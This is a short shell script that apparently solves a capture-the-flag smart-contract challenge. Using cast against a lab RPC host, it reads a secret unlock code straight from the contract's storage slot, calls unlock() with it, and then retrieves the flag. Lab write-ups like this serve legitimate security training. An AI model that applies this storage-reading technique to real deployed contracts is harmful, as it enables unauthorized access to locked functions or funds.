```  
CONTRACT="0xab9A67BDA6C35E84B64F48A12c668978A450c7B0" PRIVATE_KEY="[private key omitted]" RPC="http://10.10.218.153:8545" # Get and decode the hint echo -n "Hint: " cast call $CONTRACT "hint()(string)" --rpc-url $RPC # Get the code from storage slot 2 (as we saw it contains 6778) CODE=$(cast --to-dec $(cast storage $CONTRACT 2 --rpc-url $RPC)) echo "Code found: $CODE" # Unlock with the correct code (6778) echo "Unlocking with code $CODE..." cast send $CONTRACT "unlock(uint256)" $CODE \ --rpc-url $RPC \ --private-key $PRIVATE_KEY \ --legacy # Verify solution echo -n "Is solved: " cast call $CONTRACT "isSolved()(bool)" --rpc-url $RPC # Get the flag if solved echo -n "Flag: " cast call $CONTRACT "getFlag()(string)" --rpc-url $RPC

```
